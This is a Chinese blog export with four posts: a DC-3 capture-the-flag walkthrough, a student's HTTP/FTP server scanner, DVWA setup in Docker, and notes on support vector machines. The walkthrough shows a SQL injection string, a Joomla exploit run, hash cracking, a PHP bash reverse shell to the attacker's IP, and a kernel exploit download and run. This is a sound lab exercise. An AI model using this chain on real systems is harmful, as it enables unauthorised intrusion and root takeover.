<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>靶机渗透-DC3</title>
    <url>/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/</url>
    <content><![CDATA[<p>靶机渗透实战：DC3靶机入侵</p>
<p>使用环境：Linux version 5.2.0-kali2-amd64<br>入侵对象：DC-3靶机-ubuntu 16.04</p>
<a id="more"></a>

<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>下载好DC3靶机后，将vmx文件导入vmware</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/DC3-File.png" style="zoom:70%;">

<p>导入后，启动DC3靶机</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/DC3-Start.png" style="zoom:70%;">

<p>我们并不知道此靶机的登录密码，开始渗透</p>
<h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>启动kali，输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p>获取当前机器所在的网段ip</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/ifconfig.png" style="zoom:100%;">

<p>启动nmap，对本网段进行扫描：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.2.0&#x2F;24</span><br></pre></td></tr></table></figure>

<p>这步也可以使用：arp-scan -l</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nmap-sn.png" style="zoom:100%;">

<p>获得了靶机的ip地址：192.168.2.116</p>
<p>对靶机192.168.2.116进行从1-65535的端口扫描port scan：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -p 1-65535 -sV 192.168.2.116</span><br></pre></td></tr></table></figure>

<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nmap-portscan.png" style="zoom:100%;">

<p> 目标只开放了80端口，我们对其进行访问 </p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/visit80.png" style="zoom:60%;">

<p>进行源代码检视，没有发现特殊的提示</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/80inspector.png" style="zoom:100%;">

<p>尝试进行SQL注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/80SQL.png" style="zoom:60%;">

<p>不通</p>
<p>用joomscan进行扫描：</p>
<p>#安装方法： apt-get install joomscan </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joomscan -u http:&#x2F;&#x2F;192.168.2.116</span><br></pre></td></tr></table></figure>

<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomscan-u1.png" style="zoom:100%;">

<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomscan-u2.png" style="zoom:100%;">

<p>发现了版本：Joomla 3.7.0<br>发现了管理员页面：<a href="http://192.168.2.116/administrator/" target="_blank" rel="noopener">http://192.168.2.116/administrator/</a></p>
<p>搜索joomla3.7.0的漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit joomla |grep 3.7</span><br></pre></td></tr></table></figure>

<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/searchsploit.png" style="zoom:100%;">

<p>发现这个版本有SQL注入漏洞(CVE-2017-8917)<br>细节:<a href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html" target="_blank" rel="noopener">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a></p>
<p>使用joomblah脚本<br>#wget <a href="https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 joomblah.py http:&#x2F;&#x2F;192.168.2.116</span><br></pre></td></tr></table></figure>

<p>得到管理员帐户admin，密码hash加密 ，为了破解密码，我们首先要识别哈希值类型，然后使用hashcat暴力破解。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashid hash.txt</span><br><span class="line">hashcat -m 3200 -a 0 -d 1 --force hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>

<p> 最后得到密码为 snoopy </p>
<p>成功登入管理员页面：</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomla-admin.png" style="zoom:70%;">

<p>因为joomla后台可编辑修改源码，我们利用这个功能，</p>
<p> 用system()执行bash -c<br>                用bash发起一个shell<br>                    kali监听<br>                        访问index.php执行脚本<br>                                  反弹shell成功 –&gt; 提权到root</p>
<p> 编辑index.php，写入反弹shell代码 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.117&#x2F;8080 0&gt;&amp;1&#39; &quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>注意，因为要连到kali，所以要填的是kali的Ip</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomla-shell2.png" style="zoom:70%;">

<p>在Kali进行监听：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8080</span><br></pre></td></tr></table></figure>

<p> 访问index.php，监听成功收到：</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nc-lvvp.png" style="zoom:100%;">

<p>成功！输入ls后能成功输出该靶机在该目录下的所有文件</p>
<p>至此说明反弹shell成功，接下来开始内核提权</p>
<p> 使用searchsploit工具查找Ubuntu 16.04的提权漏洞 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>

<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/39772.png" style="zoom:100%;">

<p> 在kali上下载ubuntu-16-39772-exp，用python开启简单的服务器，再利用反弹shell让靶机下载kali这里下好的exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9000</span><br></pre></td></tr></table></figure>

<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/python-server.png" style="zoom:100%;">

<p>利用反弹shell让靶机下载：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.2.117:9000&#x2F;exploit.tar</span><br></pre></td></tr></table></figure>

<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/shell-download1.png" style="zoom:100%;">

<p>下载成功</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/python-server2.png" style="zoom:100%;">

<p>之后利用反弹shell令靶机执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure>

<p>运行成功！拿到了靶机的root权限！</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/root.png" style="zoom:100%;">

<p>输入id命令与whoami命令，都能确认我们已经拿到了root权限：</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/root2.png" style="zoom:100%;">

<p>进入root文件夹，cat 出 flag:</p>
<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/flag.png" style="zoom:100%;">

<p>至此，入侵靶机成功~~  花了差不多一下午的时间，还是蛮有意思的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root</span><br><span class="line">ls</span><br><span class="line">the-flag.txt</span><br><span class="line">    </span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      &#x2F; &#x2F;__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ &#x2F;\ &#x2F; &#x2F; _ \ | | | | | |&#x2F; _ \| &#39;_ \ &#x2F; _ \ | | | |</span><br><span class="line">   \ V  V &#x2F;  __&#x2F; | | | |_| | (_) | | | |  __&#x2F;_|_|_|_|</span><br><span class="line">    \_&#x2F;\_&#x2F; \___|_|_| |____&#x2F; \___&#x2F;|_| |_|\___(_|_|_|_)</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">Congratulations are in order for completing DC-3VM.  :-)</span><br><span class="line"></span><br><span class="line">I hope you&#39;ve enjoyed this challenge as much as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please let me know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP与FTP服务器搜索</title>
    <url>/2020/05/02/HTTP%E4%B8%8EFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<p>HTTP与FTP服务器搜索软件，为本人的计算机网络的课程设计作业</p>
<a id="more"></a>

<h3 id="要求与功能"><a href="#要求与功能" class="headerlink" title="要求与功能"></a>要求与功能</h3><p><strong>设计要求：</strong><br>1）由客户指定搜索IP段。<br>2）实现多线程搜索，要求搜索速度要尽可能高。<br>3）将所有搜索到的FTP站点统一列出。<br>4）设计美观易用的图形界面。</p>
<h3 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h3><p>本人在完成了FTP站点搜索器的基础上，又增加了HTTP站点的扫描功能。  </p>
<p>最终效果：</p>
<img src="/2020/05/02/HTTP%E4%B8%8EFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%9C%E7%B4%A2/最终效果.png" style="zoom:75%;">

<h3 id="实现说明"><a href="#实现说明" class="headerlink" title="实现说明"></a>实现说明</h3><h4 id="设备与环境"><a href="#设备与环境" class="headerlink" title="设备与环境"></a>设备与环境</h4><p>处理器： Intel(R)<em>Core(TM)_i7-7700HQ_CPU</em>@_2.80GHz<br>操作系统：        Windows10 x64<br>程序实现语言：Python 3.5.6</p>
<h4 id="关键部分程序实现"><a href="#关键部分程序实现" class="headerlink" title="关键部分程序实现"></a>关键部分程序实现</h4><p>HTTP服务器查询部分的关键部分代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: <span class="string">'0'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/4.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.3029.110 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url=urlHead+str(ipAddressList[<span class="number">0</span>])+dot+str(ipAddressList[<span class="number">1</span>])+dot+str(ipAddressList[<span class="number">2</span>])+dot+str(ipAddressList[<span class="number">3</span>])+<span class="string">"/"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#r = requests.get(url=url, data=params, headers=headers,timeout=3) #3second</span></span><br><span class="line">    <span class="comment">#r = requests.get(url=url,  headers=headers,  timeout=3)  # 3second</span></span><br><span class="line">    <span class="comment">#requests.packages.urllib3.disable_warnings()# 忽略无证书警告 在https可用到</span></span><br><span class="line">    r = requests.get(url=url, timeout=<span class="number">1</span>,verify=<span class="literal">False</span>)  <span class="comment"># 3second</span></span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    print(threadName+<span class="string">": url:"</span>+url+<span class="string">" successfully response ; status_code:"</span>+str(r.status_code))</span><br><span class="line">    <span class="keyword">if</span>(r.status_code&lt;<span class="number">300</span>):</span><br><span class="line">        writeFile(url+<span class="string">"   ;status_code: "</span>+ str(r.status_code))</span><br><span class="line">        printOnTextbox(<span class="string">"\n:[*] url:"</span> + url + <span class="string">" 成功响应 ; status_code:"</span> + str(r.status_code)+<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> reason:</span><br><span class="line">    print(threadName+<span class="string">": url:"</span>+url+<span class="string">"连接失败，原因："</span>+str(reason))</span><br><span class="line">    printOnTextbox(<span class="string">": url:"</span> + url + <span class="string">"连接失败，原因："</span>+str(reason))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>FTP服务器搜索部分的关键代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">status = <span class="number">0</span></span><br><span class="line">port = [<span class="number">21</span>]  </span><br><span class="line">address = str(address)</span><br><span class="line"><span class="keyword">for</span> portscan <span class="keyword">in</span> port:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">1</span>)  </span><br><span class="line">        s.connect((address, portscan))</span><br><span class="line">        print(<span class="string">"[*]"</span>, address, <span class="string">"on: "</span>, portscan, <span class="string">"is OPEN, scan successfully"</span>)</span><br><span class="line">        printOnTextbox(<span class="string">"[*]"</span>+str(address)+ <span class="string">"on: "</span>+str(portscan)+ <span class="string">"is OPEN, scan successfully"</span>)</span><br><span class="line">        s.shutdown(socket.SHUT_RDWR)</span><br><span class="line">        s.close</span><br><span class="line">        status = <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:  </span><br><span class="line">        print(<span class="string">"连接FTP"</span>, portscan, <span class="string">"端口失败，地址："</span>, address+<span class="string">" ; 原因："</span>+str(msg))</span><br><span class="line">        printOnTextbox(<span class="string">"连接FTP"</span>+ str(portscan)+ <span class="string">"端口失败，地址："</span>+str(address) + <span class="string">" ; 原因："</span> + str(msg))</span><br><span class="line">        err = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line"><span class="keyword">finally</span>:  </span><br><span class="line">        s.close()</span><br><span class="line"><span class="keyword">return</span> status</span><br></pre></td></tr></table></figure>

<p>多线程：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> threadid <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>): <span class="comment"># 以6为结尾代表1~5总共5个线程</span></span><br><span class="line">    _thread.start_new_thread(tryFind, (<span class="string">"Thread-"</span>+str(threadid),))</span><br></pre></td></tr></table></figure>

<p>由于使用了多线程，所以需要考虑到数据安全，因此需要互斥锁mutex：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mutexGlobalIpAddress = threading.Lock()</span><br></pre></td></tr></table></figure>

<p>上锁操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mutexGlobalIpAddress.acquire()</span><br></pre></td></tr></table></figure>

<p>解锁操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mutexGlobalIpAddress.release()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>TCP通信</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker与DVWA</title>
    <url>/2020/03/11/Docker%E4%B8%8EDVWA/</url>
    <content><![CDATA[<p>由于需要做网络渗透方面的学习，所以需要建立一些靶机，因此使用docker容器，建立DVWA</p>
<a id="more"></a>

<h3 id="related-works"><a href="#related-works" class="headerlink" title="related works"></a>related works</h3><p>安装docker toolbox<br>为了节省C盘空间，可以在Oracle VM VirtualBox中将docker虚拟机的虚拟磁盘移到了d盘去</p>
<p>安装完docker toolbox 后，首先要做的就是换源</p>
<p>我使用了阿里云的源</p>
<blockquote>
<p>docker-machine ssh default</p>
<p>sudo sed -i “s|EXTRA_ARGS=’|EXTRA_ARGS=’–registry-mirror=<a href="https://6t7smst7.mirror.aliyuncs.com" target="_blank" rel="noopener">https://6t7smst7.mirror.aliyuncs.com</a> |g” /var/lib/boot2docker/profile </p>
<p>exit</p>
</blockquote>
<p>换完后重启</p>
<blockquote>
<p>docker-machine restart default</p>
</blockquote>
<p>拉取DVWA:</p>
<blockquote>
<p>docker pull citizenstig/dvwa</p>
</blockquote>
<p>运行:</p>
<blockquote>
<p>docker run -d -p 8080:80 citizenstig/dvwa</p>
</blockquote>
<p>成功后，可以查看状态：</p>
<blockquote>
<p>docker ps -a</p>
</blockquote>
<img src="/2020/03/11/Docker%E4%B8%8EDVWA/ps.png" style="zoom:100%;">

<p>查看Ip:</p>
<blockquote>
<p>docker-machine ip default </p>
</blockquote>
<p>通过该ip以及相应的端口(前面设置的是8080)，即可访问dvwa:</p>
<img src="/2020/03/11/Docker%E4%B8%8EDVWA/dvwa1.png" style="zoom:100%;">

<p>使用默认的账号登录：<br>admin<br>password</p>
<p>即可成功进入：</p>
<img src="/2020/03/11/Docker%E4%B8%8EDVWA/dvwa2.png" style="zoom:100%;">

<p>在DVWA Security中，可以设置security level ，刚开始可以将安防等级设置较低，降低渗透难度：</p>
<img src="/2020/03/11/Docker%E4%B8%8EDVWA/dvwa3.png" style="zoom:100%;">

]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>支持向量机</title>
    <url>/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/</url>
    <content><![CDATA[<blockquote>
<p>由于内容比较多，所以写了比较长的时间，从22号断断续续写到25号才写完</p>
</blockquote>
<h2 id="间隔与支持向量"><a href="#间隔与支持向量" class="headerlink" title="间隔与支持向量"></a>间隔与支持向量</h2><p>给定训练样本集：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/训练样本集.png" style="zoom:100%;">

<p>分类学习最基本的想法就是基于训练、集D 在样本空间中找到一个划分超平面、将<br>不同类别的样本分开。</p>
<p>在样本空间中，划分超平面可通过如下线性方程来描述:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/线性方程.png" style="zoom:100%;">

<p>其中w = (ω1,ω2, … ,ωd) 为法向量，决定了超平面的方向; b 为位移项，决定了超平面与原点之间的距离.显然，划分超平面可被法向量ω和位移b确定，下面我们将其记为(ω,b).样本空间中任意点x到超平面(ω,b)的距离可写为:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/点到平面距离.png" style="zoom:100%;">

<p>证明如下：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/点到平面距离证明.jpg" style="zoom:50%;">

<p>假设超平面(ω,b)能将训练样本正确分类，即对于(xi,yi) ∈ D , 若yi = +1 , 则有 ωTxi+b&gt;0;若yi = -1 , 则有 ωTxi+b&lt;0。令：(ω和b参数的约束式)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/支持向量机基本分类式.png" style="zoom:100%;">

<p>如下图所示，距离超平面最近的这几个训练样本点使上式的等号成立，它们被称为”支持向量” (support vector) ，两个异类支持向量到超平面的距离之和为:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/异类间隔.png" style="zoom:100%;">

<p>它被称为间隔。(使用上面的点到超平面距离公式代入上面正确分类的定义式即可很容易推导出)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/支持向量与间隔.png" style="zoom:100%;">

<p>欲找到具有”最大间隔” (maximum margin) 的划分超平面，也就是要找<br>到能满足式中约束的参数ω和b ， 使得γ最大，即:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/约束式写法1.png" style="zoom:100%;">

<p>其中s.t. ，指 subject to，受限制于… ，即指代2式为约束，然后使得1式最大。之所以可以写成2式，是因为在负样本中，亦有： (-1)*(-1)=1&gt;0 </p>
<p>注：在此处，间隔看似仅与ω有关，但事实上b通过约束式暗中地影响着ω的取值，进而对间隔产生影响</p>
<p>重新看回上式为了最大化1式(最大化间隔)，只需使其分母最小，因此可以等价为：（6.6）</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/约束式写法2.png" style="zoom:100%;">

<p>这就是支持向量机(Support Vector Machine，简称SVM) 的基本型.</p>
<p>最后，超平面对应的模型为：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/超平面模型.png" style="zoom:100%;">

<a id="more"></a>

<h2 id="对偶问题"><a href="#对偶问题" class="headerlink" title="对偶问题"></a>对偶问题</h2><p>对上上式使用拉格朗日乘子法可得到其”对偶问题” (dual problem).</p>
<blockquote>
<p>可参考： <a href="https://blog.csdn.net/fkyyly/article/details/86488582" target="_blank" rel="noopener">https://blog.csdn.net/fkyyly/article/details/86488582</a> </p>
</blockquote>
<p>具体来说，对式中每条约束添加拉格朗日乘子 αi&gt;=0 ，则该问题的拉格朗日函数可写为:(式6.8)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/拉格朗日函数.png" style="zoom:100%;">

<p>其中α=(α1;α2; … ;αm). 令L(ω , b , α) 对ω和b的偏导为零可得:(6.9)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/求偏导等为零.png" style="zoom:100%;">

<p>再将这两式先后代回式6.8，即可将其中的ω和b消去，得到：(6.11)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式6111.png" style="zoom:100%;">

<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式6112.png" style="zoom:100%;">

<p>对此式，求解α(求解方法下面会说)，得出α后，再算出ω和b，即：(6.12)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/对偶最终模型.png" style="zoom:100%;">

<p>从对偶问题(6.11)解出的问是式(6.8) 中的拉格朗日乘子，它恰对应着训练样本(Xi,Yi). 由于式(6.6) 中有不等式约束，因此上述过程需满足KKT(Karush-Kuhn-Tucker) 条件，即要求：(6.13)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/KKT条件.png" style="zoom:100%;">

<p>于是，对任意训练样本(Xi， Yi) ， 总有αi=0 或 yf(Xi) = 1.<br>若αi=0 , 则该样本将不会在式(6.12) 的求和中出现，也就不会对f(x)有任何影响;<br>若αi&gt;0 , 则必有 yif(xi) = 1 ，其所对应的样本点位于最大间隔边界上，是一个支持向量.<br>这显示出支持向量机的一个重要性质:训练完成后，大部分的训练样本都不需保留，最终模型仅与支持向量有关，其复杂度主要与支持向量的数目有关。</p>
<p>回到上面求解6.11式的问题：<br>这是一个二次规划问题，可使用通用的二次规划算法来求解；然而，该问题的规模正比于训练样本数，这会在实际任务中造成很大的开销.为了避开这个障碍，人们通过利用问题本身的特性，提出了很多高效算法， SMO (Sequential Minimal Optimization) (顺序最小优化)是其中一个著名的代表[Platt 1998].</p>
<h3 id="SMO"><a href="#SMO" class="headerlink" title="SMO"></a>SMO</h3><p>SMO 的基本思路是先固定αi之外的所有参数，然后求αi上的极值.由于存在约束：(上6.9)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/SMO约束.png" style="zoom:100%;">

<p>若固定αi之外的其他变量，那么αi也可由其他变量求解出，于是， SMO 每次选择两个变量αi和αj，并固定其他参数，这样，在参数初始化后， SMO 不断执行如下两个步骤直至收敛:<br>(1)选取一对需更新的变量αi和αj;<br>(2)固定αi和αj以外的参数，求解式(6.11)获得更新后的αi和αj</p>
<p>注意到只需选取的αi和αj中有一个不满足KKT 条件(6.13) ，目标函数就会在选代后增长[Osuna et al., 1997]. 直观来看， KKT 条件违背的程度越大，则变量更新后可能导致的目标函数值增幅越多。</p>
<p>于是， SMO 先选取违背KKT条件程度最大的变量.第二个变量应选择一个使目标函数值增长最快的变量</p>
<blockquote>
<p>注：回看式子6.13：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/KKT条件.png" style="zoom:100%;">

<p>除了第一个非负约束以外，其他约束都是根据目标函数推导得到的最优解必须满足的条件，如果违背了这些条件，那得到的解必然不是最优的，目标函数的值会减小。 </p>
<p>所以在SMO迭代的两个步骤中，只要αi和αj中有一个违背了KKT条件，这一轮迭代完成后，目标函数的值必然会增大。Generally speaking，KKT条件违背的程度越大，迭代后的优化效果越明显，增幅越大。 </p>
<p>因此，若要使得整个算法更快速，和梯度下降类似，我们要找到使之优化程度最大的方向（变量）进行优化。</p>
<p>所以SMO先选取违背KKT条件程度最大的变量，那么第二个变量应该选择使目标函数值增大最快的变量，但是这个变量怎么找呢？比较各变量优化后对应的目标函数值的变化幅度？这个样子是不行的，复杂度太高了。 </p>
</blockquote>
<p>由于比较各变量所对应的目标函数值减幅的复杂度过高，因此SMO 采用了一个启发式(不能得到最优解，但能得到可行解，与最优解之间的误差在可接受范围内):使选取的两变量所对应样本之间的间隔最大.一种直观的解释是，这样的两个变量有很大的差别，与对两个相似的变量进行更新相比，对它们进行更新会带给目标函数值更大的变化.</p>
<p>SMO 算法之所以高效，是由于在固定其他参数后，仅优化两个参数的过程能做到非常高效.具体来说，仅考虑αi和αj时，式(6.11) 中的约束可重写为（将约束式中αiyi和αjyj提出即可得）(6.14)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式614.png" style="zoom:100%;">

<p>其中，c: (6.15)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式615.png" style="zoom:100%;">

<p>用上式代入6.11中原式1，即可消去变量αj，得到一个关于αi的单变量二次规划问题，仅有的约束是αi&gt;=0. (的二次规划问题具有公式解(解析解))</p>
<p>如何确定偏移项b呢?因为支持向量位于边界，即对任意支持向量(Xs,Ys) ,都有 Ysf(Xs) = 1, 即：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式617.png" style="zoom:100%;">

<p>其中S为所有支持向量的F标集.理论上，可选取任意支持向量并通过求上解式获得b；但现实任务中常采用一种更鲁棒的做法：使用所有支持向量求解的平均值：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式618.png" style="zoom:100%;">

<h2 id="核函数"><a href="#核函数" class="headerlink" title="核函数"></a>核函数</h2><h3 id="核函数引言"><a href="#核函数引言" class="headerlink" title="核函数引言"></a>核函数引言</h3><img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/核函数异或映射.png" style="zoom:100%;">

<p>利用函数(不叫核函数)，将样本从原始空间映射到一个更高维的特征空间，使得样本在这个特征空间内线性可分.</p>
<p>令Φ(x) 表示将x映射后的特征向量，于是， 在特征空间中划分超平面所对应的模型可表示为:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式619.png" style="zoom:100%;">

<p>其中ω和b是模型参数.类似式(6.6），有：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式620.png" style="zoom:100%;">

<p>其对偶问题为：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式6211.png" style="zoom:100%;">

<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式6212.png" style="zoom:100%;">

